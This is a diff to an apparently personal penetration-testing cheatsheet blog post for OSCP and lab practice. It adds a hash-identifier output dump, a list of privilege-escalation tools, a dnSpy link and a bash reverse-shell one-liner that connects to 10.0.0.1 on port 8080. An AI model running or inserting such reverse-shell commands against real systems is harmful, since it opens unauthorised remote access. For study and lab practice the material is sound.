@@ -1,9 +1,9 @@
 ---
 title : "Cheatsheet"
 author: imdang 🤞🤞
-date: 2024-10-23 11:33:00 +0800
+date: 2024-10-22 11:30:00 +0800
 categories: [Cheatsheet]
-tags: [nmap,gobuster,ffuf,jadx,linpeas,OSCP]
+tags: [nmap,gobuster,ffuf,jadx,linpeas,dnspy,zeek,OSCP]
 ---
 
 <!-- ![image](https://user-images.githubusercontent.com/59029171/139866885-bc8556d4-7979-4d42-9d4e-027c0900f245.png) -->
@@ -83,8 +83,28 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 Githack
 python GitHack.py http://site.htb/.git/
 ```
-
-
+### Hash Identifier
+``` shell 
+hash-identifier  
+┌──(kali㉿kali)-[~/TCM/TCM03_Academy]
+└─$ hash-identifier            
+/usr/share/hash-identifier/hash-id.py:13: SyntaxWarning: invalid escape sequence '\ '
+  logo='''   #########################################################################
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH:
+```
 # Privilege Escalation 
 
 ### Check sudo file permissions
@@ -92,7 +112,20 @@ python GitHack.py http://site.htb/.git/
 ```shell
 sudo -l
 ```
+### Tools
+- linpeas
+- pspy - https://github.com/DominicBreuker/pspy - Show all process run in linux 
 
+### Reverse shell
+```shell
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
+# Reverse Tools
+
+## C# and .NET
+- [*dnSpy*](https://github.com/dnSpy/dnSpy)
+![image](https://raw.githubusercontent.com/ficstkeyfx/ficstkeyfx.github.io/refs/heads/main/.github/images/20241113_reverse_tearordear_username.png)
 # Other Tools
 
 If you find my articles interesting, you can buy me a coffee 
